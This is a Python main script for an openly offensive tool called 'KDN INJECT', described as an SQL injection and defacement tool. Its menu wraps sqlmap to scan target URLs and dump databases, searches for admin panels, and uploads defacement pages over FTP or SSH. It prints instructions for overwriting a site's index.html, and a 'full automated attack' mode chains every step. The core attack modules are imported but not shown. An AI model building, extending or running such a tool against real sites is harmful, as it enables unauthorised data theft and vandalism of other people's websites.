#!/usr/bin/env python3
"""
KDN INJECT v2.0 - Ultimate SQLi & Deface Tool
Author: KeJaaDarkNet
GitHub: github.com/kejaadarknet/kdn-inject
"""

import os
import sys
import json
import time
import subprocess
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Add core to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'core'))

# Banner
BANNER = f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  {Fore.YELLOW}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓                                                     ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   ██╗  ██╗██████╗ ███╗   ██╗     ██╗███╗   ██╗      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   ██║ ██╔╝██╔══██╗████╗  ██║     ██║████╗  ██║      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   █████╔╝ ██║  ██║██╔██╗ ██║     ██║██╔██╗ ██║      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   ██╔═██╗ ██║  ██║██║╚██╗██║██   ██║██║╚██╗██║      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   ██║  ██╗██████╔╝██║ ╚████║╚█████╔╝██║ ╚████║      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═══╝      ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓                                                     ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   {Fore.GREEN}A U T O M A T E D   P E N E T R A T I O N{Fore.YELLOW}       ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓   {Fore.RED}C r e a t e d   b y :   K e J a a D a r k N e t{Fore.YELLOW}  ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓                                                     ▓{Fore.CYAN}  ║
║  {Fore.YELLOW}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Fore.CYAN}  ║
║                                                              ║
║                    {Fore.MAGENTA}Version 2.0 - GitHub Edition{Fore.CYAN}                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

class KDNInject:
    def __init__(self):
        self.target = ""
        self.current_template = ""
        self.config = self.load_config()
        
    def load_config(self):
        """Load configuration"""
        config_file = "config/settings.json"
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {"sqlmap_path": "bin/sqlmap/sqlmap.py"}
    
    def check_setup(self):
        """Check if setup is complete"""
        if not os.path.exists("bin/sqlmap"):
            print(f"\n{Fore.RED}[!] SQLMap not found!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Run setup first:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    python3 setup.py{Style.RESET_ALL}")
            return False
        return True
    
    def show_menu(self):
        """Display menu"""
        print(f"\n{Fore.CYAN}╔{'═'*50}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}                    M A I N   M E N U{Fore.CYAN}                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠{'═'*50}╣{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}1.{Style.RESET_ALL} Scan SQL Injection Vulnerability         {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}2.{Style.RESET_ALL} Dump Database                          {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}3.{Style.RESET_ALL} Find Admin Panels                      {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}4.{Style.RESET_ALL} Upload Deface Page                     {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}5.{Style.RESET_ALL} Full Automated Attack                  {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}6.{Style.RESET_ALL} List Available Templates               {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}7.{Style.RESET_ALL} Update Tool                           {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}0.{Style.RESET_ALL} Exit                                   {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
    
    def run_scan(self):
        """Run SQL injection scan"""
        print(f"\n{Fore.CYAN}[*] SQL INJECTION SCANNER{Style.RESET_ALL}")
        self.target = input(f"{Fore.GREEN}[?] Target URL (with ?id=): {Style.RESET_ALL}")
        
        # Import scanner module
        from scanner import SQLScanner
        scanner = SQLScanner(self.config['sqlmap_path'])
        scanner.scan(self.target)
    
    def run_dump(self):
        """Dump database"""
        if not self.target:
            self.target = input(f"{Fore.GREEN}[?] Target URL: {Style.RESET_ALL}")
        
        from dumper import DatabaseDumper
        dumper = DatabaseDumper(self.config['sqlmap_path'])
        dumper.dump(self.target)
    
    def list_templates(self):
        """List available templates"""
        templates_dir = "templates"
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir, exist_ok=True)
        
        html_files = [f for f in os.listdir(templates_dir) if f.endswith('.html')]
        
        print(f"\n{Fore.CYAN}[*] AVAILABLE TEMPLATES{Style.RESET_ALL}")
        if html_files:
            for i, file in enumerate(html_files, 1):
                print(f"  {Fore.YELLOW}{i}.{Style.RESET_ALL} {file}")
        else:
            print(f"{Fore.YELLOW}[!] No templates found in 'templates/' folder{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Add your HTML files to: {os.path.abspath(templates_dir)}{Style.RESET_ALL}")
        
        return html_files
    
    def select_template(self):
        """Select a template"""
        templates = self.list_templates()
        if not templates:
            return None
        
        try:
            choice = int(input(f"\n{Fore.GREEN}[?] Select template (number): {Style.RESET_ALL}"))
            if 1 <= choice <= len(templates):
                selected = templates[choice-1]
                self.current_template = os.path.join("templates", selected)
                print(f"{Fore.GREEN}[+] Selected: {selected}{Style.RESET_ALL}")
                return self.current_template
        except:
            pass
        
        return None
    
    def run_deface(self):
        """Upload deface page"""
        print(f"\n{Fore.CYAN}[*] DEFACE PAGE UPLOADER{Style.RESET_ALL}")
        
        template = self.select_template()
        if not template:
            return
        
        from defacer import DefaceUploader
        uploader = DefaceUploader()
        
        print(f"\n{Fore.YELLOW}[*] Upload Methods:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Manual Instructions")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} FTP Upload")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} SSH Upload")
        
        method = input(f"\n{Fore.GREEN}[?] Select method: {Style.RESET_ALL}")
        
        if method == "2":
            host = input(f"{Fore.GREEN}[?] FTP Host: {Style.RESET_ALL}")
            user = input(f"{Fore.GREEN}[?] FTP Username: {Style.RESET_ALL}")
            password = input(f"{Fore.GREEN}[?] FTP Password: {Style.RESET_ALL}")
            uploader.upload_via_ftp(template, host, user, password)
        
        elif method == "3":
            host = input(f"{Fore.GREEN}[?] SSH Host: {Style.RESET_ALL}")
            user = input(f"{Fore.GREEN}[?] SSH Username: {Style.RESET_ALL}")
            password = input(f"{Fore.GREEN}[?] SSH Password: {Style.RESET_ALL}")
            uploader.upload_via_ssh(template, host, user, password)
        
        else:
            print(f"\n{Fore.YELLOW}[*] MANUAL UPLOAD INSTRUCTIONS:{Style.RESET_ALL}")
            print(f"1. File: {template}")
            print(f"2. Rename to: index.html")
            print(f"3. Upload to web root (e.g., /var/www/html/)")
            print(f"4. Overwrite existing index.html")
    
    def run_full_attack(self):
        """Full automated attack"""
        print(f"\n{Fore.RED}[!] FULL AUTOMATED ATTACK MODE{Style.RESET_ALL}")
        
        self.target = input(f"{Fore.GREEN}[?] Target URL: {Style.RESET_ALL}")
        
        # Scan
        print(f"\n{Fore.CYAN}[*] Step 1: Scanning for SQLi...{Style.RESET_ALL}")
        self.run_scan()
        
        # Dump
        print(f"\n{Fore.CYAN}[*] Step 2: Dumping database...{Style.RESET_ALL}")
        self.run_dump()
        
        # Find admin
        print(f"\n{Fore.CYAN}[*] Step 3: Finding admin panels...{Style.RESET_ALL}")
        from admin_finder import AdminFinder
        finder = AdminFinder()
        base_url = self.target.split('?')[0] if '?' in self.target else self.target
        finder.scan(base_url)
        
        # Deface
        print(f"\n{Fore.CYAN}[*] Step 4: Deface page ready{Style.RESET_ALL}")
        self.list_templates()
        
        print(f"\n{Fore.GREEN}[✓] Attack sequence completed!{Style.RESET_ALL}")
    
    def update_tool(self):
        """Update from GitHub"""
        print(f"\n{Fore.CYAN}[*] UPDATING KDN INJECT{Style.RESET_ALL}")
        
        if os.path.exists(".git"):
            print(f"{Fore.YELLOW}[*] Pulling updates from GitHub...{Style.RESET_ALL}")
            subprocess.run(["git", "pull"])
        else:
            print(f"{Fore.YELLOW}[*] Downloading latest version...{Style.RESET_ALL}")
            # Simple update check
            print(f"{Fore.GREEN}[✓] Check updates at: github.com/kejaadarknet/kdn-inject{Style.RESET_ALL}")
    
    def run(self):
        """Main loop"""
        print(BANNER)
        
        if not self.check_setup():
            return
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.YELLOW}KDN>{Style.RESET_ALL} ")
            
            try:
                if choice == "1":
                    self.run_scan()
                elif choice == "2":
                    self.run_dump()
                elif choice == "3":
                    from admin_finder import AdminFinder
                    target = input(f"{Fore.GREEN}[?] Target URL: {Style.RESET_ALL}")
                    finder = AdminFinder()
                    finder.scan(target)
                elif choice == "4":
                    self.run_deface()
                elif choice == "5":
                    self.run_full_attack()
                elif choice == "6":
                    self.list_templates()
                elif choice == "7":
                    self.update_tool()
                elif choice == "0":
                    print(f"\n{Fore.GREEN}[+] Exit. Remember: Stay ethical!{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
                
                input(f"\n{Fore.CYAN}[Press Enter to continue...]{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Interrupted{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

def main():
    tool = KDNInject()
    tool.run()

if __name__ == "__main__":
    main()